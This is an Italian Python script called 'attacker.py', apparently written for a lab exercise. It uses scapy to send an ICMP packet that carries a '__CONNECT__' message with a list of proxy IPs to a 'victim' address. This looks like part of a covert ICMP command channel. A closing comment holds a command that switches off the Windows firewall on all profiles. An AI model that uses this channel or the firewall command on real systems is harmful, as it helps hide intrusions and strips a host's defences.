#L'attaccante riceve i messaggi da determinati indirizzi
#Ricevuti tutti, li unisce in un unico messaggio

#from scapy.all import *
from scapy.all import IP, ICMP, sr1

import string
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--ip_vittima',type=str, help='IP della vittima')
#parser.add_argument('--provaFlag',type=int, help='Comando da eseguire')

proxyIP = [
    "192.168.56.101"
    ,"192.168.56.103"
    #,"192.168.56.xxx"
] 

def printSupportedArguments():
    print("Controlla di inserire due volte - per gli argomenti")
    print("Argomenti supportati:")
    print("\t--ip_vittima: IP della vittima")

def check_args():
    try:
        args, unknown = parser.parse_known_args()
        #args= parser.parse_args()
        print("Argomenti passati: {}".format(args))
        if len(unknown) > 0:
            print("Argomenti sconosciuti: {}".format(unknown))
            printSupportedArguments()
            exit(1) 
        return args
    except Exception as e:
        print("Errore: {}".format(e)) 
        exit(1)

def conn_To_Vittima(ip_vittima):
    print(f"Connessione stabilita con {ip_vittima}")
    pkt = IP(dst=ip_vittima)/ICMP() / "".join(
        "__CONNECT__ "+proxyIP[index] if index==0 
        else ", "+proxyIP[index] 
        for index in range(len(proxyIP)
    ))
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip_vittima} is alive")
        #ans.show()
    else:
        print(f"No reply: {ip_vittima} is not responding") 

if __name__ == "__main__":
    #1) l'attaccante si connettte prima con la vittima
    args=check_args()
    if args.ip_vittima is None:
        print("Devi specificare l'IP della vittima con --ip_vittima")
        printSupportedArguments()
        exit(1)
    conn_To_Vittima(args.ip_vittima)
    exit(0)

#py .\attacker.py --ip_vittima 192.168.56.101
#netsh advfirewall set allprofiles state off